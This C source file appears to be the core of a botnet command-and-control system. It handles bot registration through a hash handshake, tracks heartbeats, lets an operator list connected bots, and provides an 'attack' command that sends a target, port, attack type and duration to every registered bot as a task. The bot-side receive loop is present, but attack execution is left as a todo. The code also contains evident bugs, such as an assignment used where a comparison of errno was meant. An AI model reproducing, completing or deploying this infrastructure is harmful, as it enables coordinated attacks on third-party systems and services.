/*
    core.c

    last modified at: 2015/4/25
    error
    
    defines packet and functions used in communicate between client and server
*/

#include "core.h"
#include "../utils/utils.h"
#include "../alg/alexjlz_hash.h"
#include "../log/log.h"
#include "../tcpip/tcpip.h"
#include "../adt/list.h"

#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <netdb.h>
#include <time.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <errno.h>
#include <pthread.h>

list_p client_list = NULL;
pthread_mutex_t client_list_mutex = PTHREAD_MUTEX_INITIALIZER;

int certify_register_packet(struct packet* p)
{
    char random_str[32] = {0};
    char client_hash[32] = {0};
    char server_hash[32] = {0};

    parse_string((p->value), random_str, "random_str", 31);
    parse_string((p->value), client_hash, "hash", 31);
    alexjlz_hash(random_str, server_hash);

    if ( strcmp(client_hash, server_hash) == 0 )
        return 1;
    else
    {
        alexjlz_log("random_str:%s client_hash:%s server_hash:%s\n", random_str, client_hash, server_hash);
        return 0;
    }
}

/*
    alexjlz_register retval:
    0:  heartbeat
    1:  task sign
    -1: register failed
*/
int alexjlz_register(struct client *c, struct packet *p)
{
    if ( !certify_register_packet(p) || (p->type != packet_register) )  // certify
        return -1;

    pthread_mutex_lock(&client_list_mutex);  // exclusively access to client_list

    int status = 0;
    struct client *c_iter = NULL;
    list_iter_p client_list_iter = list_iterator(client_list, FRONT);
    
    parse_string(p->value, c->uuid, "uuid", sizeof(c->uuid));  // this is for identify client
    while ( (c_iter = list_next(client_list_iter)) != NULL )
    {
        if ( strcmp(c->uuid, c_iter->uuid) == 0 ) // heartbeat
        {
            alexjlz_log("client <<%s>> (ip:%s)  heartbeat!\n", c_iter->uuid, c_iter->ip);

            // update info
            strcpy(c_iter->ip, c->ip);  // update ip 
            c_iter->last_heartbeat = time(NULL); // update heartbeat
            bzero(c_iter->asc_last_heartbeat, sizeof(c_iter->asc_last_heartbeat));
            alexjlz_time(c_iter->asc_last_heartbeat); // ascii heartbeat
            parse_string(p->value, c_iter->current_task, "current_task", sizeof(c_iter->current_task)); // current task
            if ( strlen(c_iter->task) != 0 )  // sign task
            {
                strcpy(c->task, c_iter->task);
                bzero(c_iter->task, sizeof(c_iter->task));
                status = 1;
            }
            break;
        }
    }
    if ( c_iter == NULL )  // register
    {
        alexjlz_log("client <<%s>> (ip:%s)  register!\n", c->uuid, c->ip);
        list_add(client_list, c, sizeof(struct client));
        status = 0;
    }

    pthread_mutex_unlock(&client_list_mutex);
    return status;
}

void *serve_client ( void *arg )
{
    int client_fd = *((int *)arg);
    fd_set client_fd_set;
    struct timeval tv;
    int retval;
    int status = 0;

    int bytes_read = 0;
    int bytes_write = 0;
    struct packet p;  // client
    struct packet q;  // server
    struct client c; bzero(&c, sizeof(c));
    char *client_ip = c.ip;

    /* get remote ip address and record it */
    if ( get_remote_ip(client_fd, client_ip) == -1 )
    {
        alexjlz_log("Error, failed to get client ip, exit...\n");
        return ;
    }

    while ( 1 )
    {
        bzero(&p, sizeof(p));
        bzero(&q, sizeof(q));
        bzero(&c, sizeof(c));
        FD_ZERO(&client_fd_set);
        FD_SET(client_fd, &client_fd_set);
        tv.tv_sec = 60;
        tv.tv_usec = 0;

        if ( get_remote_ip(client_fd, client_ip) == -1 )
        {
            alexjlz_log("Warn, failed to get client ip, exit...\n");
        }
        /* wait for client to send packet for 6 secs */
        retval = select(client_fd+1, &client_fd_set, NULL, NULL, &tv);
        if ( retval == -1 )  // error
        {
            alexjlz_log("Error, select retval == -1\n");
            if ( check_fd(client_fd) )
                close(client_fd);
            return ;
        }
        else if ( retval == 0 ) // timeout
        {
            alexjlz_log("Error, select timeout\n");
            if ( check_fd(client_fd) )
                close(client_fd);
            return;
        }
        bytes_read = readn ( client_fd, &p, sizeof(p) );  // else readable
        if ( bytes_read != sizeof(p) )
        {
            alexjlz_log("Error, serve readn read %d bytes\n", bytes_read);
            if ( check_fd(client_fd) )
                close(client_fd);
            return ;
        }

        status = alexjlz_register(&c, &p);
        if ( status == -1 ) // packet is 
        {
            if ( check_fd(client_fd) )
                close(client_fd);
            return ;
        }
        else if ( status == 1 )  // register ( or heartbeat ) client, and maybe sign task for client
        {
            alexjlz_log("Sign task to client\n");
            bzero(&q, sizeof(q));
            q.type = packet_task_sign;
            q.flag = 0;
            sprintf(q.value, "%s", c.task);
            if ( writen( client_fd, &q, sizeof(q) ) != sizeof(q))
            {
                alexjlz_log("Error, sign task: %s to client: %s, ip:%s\n", &(c.task), &(c.uuid), &(c.ip));
            }
        }
    }

    return ;
}

int ask_for_service( int server_fd )
{
    extern char uuid[32];

    fd_set server_fd_set;
    struct timeval tv;
    int retval;

    int bytes_read = 0;
    int bytes_write = 0;
    struct packet p; // client (self)
    struct packet q; // server (remote)
    char random_str[32] = {0};
    char hash[32] = {0};

    while ( 1 )
    {
        bzero(&p, sizeof(p));
        bzero(&q, sizeof(q));
        bzero(random_str, sizeof(random_str));
        bzero(hash, sizeof(hash));
        randomstr(random_str, 20);   // register to server
        alexjlz_hash(random_str, hash);

        sprintf(p.value, "random_str:%s hash:%s uuid:%s", random_str, hash, uuid);
        p.type = packet_register;
        if (writen(server_fd, &p, sizeof(p)) != sizeof(p) )
        {
            fprintf(stderr, "Error: writen\n");
            if ( check_fd(server_fd) )
                close(server_fd);
            return -1;
        }

        FD_ZERO(&server_fd_set);
        FD_SET(server_fd, &server_fd_set);
        tv.tv_sec = 3;
        tv.tv_usec = 0;
        retval = select(server_fd+1, &server_fd_set, NULL, NULL, &tv);
        if ( retval == -1 )  // error
        {
            fprintf(stderr, "Error, select retval == -1\n");
            if ( check_fd(server_fd) )
                close(server_fd);
            return -1;
        }
        else if ( retval == 0 ) // timeout means no task
        {
            //if ( check_fd(server_fd) )
            //    close(server_fd);
            //return 0;
            continue;
        }
        else  // sign comes ( or closed by server ? ), or the other end closed the connection, please man select
        {
            bytes_read = readn ( server_fd, &q, sizeof(q) );
            if ( bytes_read != sizeof(p) )  // this would happen when the other end \
                                            // closed the connection or network error, anyway, just return
            {
                if ( check_fd(server_fd) )
                    close(server_fd);
                return 0;
            }
            if ( q.type == packet_task_sign )
            {
                fprintf(stdout, "Info, got task:%s\n", q.value); // todo: fork task
            }
        }
    }
    
    return 0;
}

int process_command(struct alexjlz_packet *p, list_p output)
{
    char cmd[32] = {0};
    struct alexjlz_packet output_packet;
    parse_string(p->value, cmd, "cmd", 31);
    if ( strcmp(cmd, "") == 0 )
    {
        bzero(&output_packet, sizeof(output_packet));
        sprintf(output_packet.value, "Error: cmd empty!\n");
        list_add(output, &output_packet, sizeof(output_packet));
    }
    else if ( strcmp(cmd, "list") == 0 )
    {
        alexjlz_log("CMD:list\n");
        pthread_mutex_lock(&client_list_mutex);
        struct client *c_iter = NULL;
        list_iter_p client_list_iter = list_iterator(client_list, FRONT);
        while ( (c_iter = list_next(client_list_iter)) != NULL )
        {
            bzero(&output_packet, sizeof(output_packet));
            sprintf(output_packet.value, "uuid:%s ip:%s last_heartbeat:%s current_task:%s\n", c_iter->uuid, c_iter->ip, c_iter->asc_last_heartbeat, c_iter->current_task);
            list_add(output, &output_packet, sizeof(output_packet));
        }
        pthread_mutex_unlock(&client_list_mutex);
    }
    else if ( strcmp(cmd, "attack") == 0 )
    {
        char attack_type[16] = {0};
        char target[256] = {0};
        char port[256] = {0};
        char time[256] = {0};
        pthread_mutex_lock(&client_list_mutex);
        struct client *c_iter = NULL;
        list_iter_p client_list_iter = list_iterator(client_list, FRONT);
        while ( (c_iter = list_next(client_list_iter)) != NULL )
        {
            strcpy( c_iter->task, p->value );
            bzero(&output_packet, sizeof(output_packet));
            sprintf(output_packet.value, "uuid:%s ip:%s task:%s\n", c_iter->uuid, c_iter->ip, c_iter->task);
        }
        list_add(output, &output_packet, sizeof(output_packet));
        pthread_mutex_unlock(&client_list_mutex);
    }
    else
    {
        bzero(&output_packet, sizeof(output_packet));
        sprintf(output_packet.value, "Error: Unkown cmd!\n");
        list_add(output, &output_packet, sizeof(output_packet));
    }
    bzero(&output_packet, sizeof(output_packet));
    sprintf(output_packet.value, OUTPUT_END);
    list_add(output, &output_packet, sizeof(output_packet));
    return 0;
}
void *serve_alexjlz( void *arg)
{
    int alexjlz_fd = *((int *)arg);
    struct alexjlz_packet p; // alexjlz -> server
    struct alexjlz_packet q; // server -> alexjlz 
    int bytes_read = 0;
    int bytes_write = 0;
    int status = 0;

    fd_set alexjlz_fd_set;
    struct timeval tv;
    int retval;

    while ( 1 )
    {
        bzero(&p, sizeof(p));
        bzero(&q, sizeof(q));
        FD_ZERO(&alexjlz_fd_set);
        FD_SET(alexjlz_fd, &alexjlz_fd_set);
        tv.tv_sec = 3600;
        tv.tv_usec = 0;
        retval = 0;

        retval = select(alexjlz_fd+1, &alexjlz_fd_set, NULL, NULL, &tv);
        if ( retval == -1 )  // error
        {
            if ( errno = EINTR )
                continue;
            else
            {
                if ( check_fd(alexjlz_fd) )
                    close(alexjlz_fd);
                return ;
            }
        }
        else if ( retval == 0 ) // timeout, this should happen when user drop out or network error
        {
            if ( check_fd(alexjlz_fd) )
                close(alexjlz_fd);
            return ;
        }
        else  // readable
        {
            bytes_read = readn(alexjlz_fd, &p, sizeof(p));
            if ( bytes_read != sizeof(p) )
            {
                if ( check_fd(alexjlz_fd) )
                    close(alexjlz_fd);
                return ;
            }
            else
            {
                list_p output = create_list();
                if ( process_command(&p, output) == 0 )
                {
                    struct alexjlz_packet *output_packet;
                    list_iter_p output_list_iter = list_iterator(output, FRONT);
                    while ( (output_packet = list_next(output_list_iter)) != NULL )
                    {
                        alexjlz_log("Write to alexjlz:%s\n", output_packet->value);
                        if ( writen(alexjlz_fd, output_packet, sizeof(*output_packet)) != sizeof(*output_packet) )
                        {
                            alexjlz_log("Error, serve_alexjlz writen not enough bytes\n");
                            break;
                        }
                    }
                }
                destroy_list(output);
                alexjlz_log("Cmd process success\n");
            }
        }
    }
}
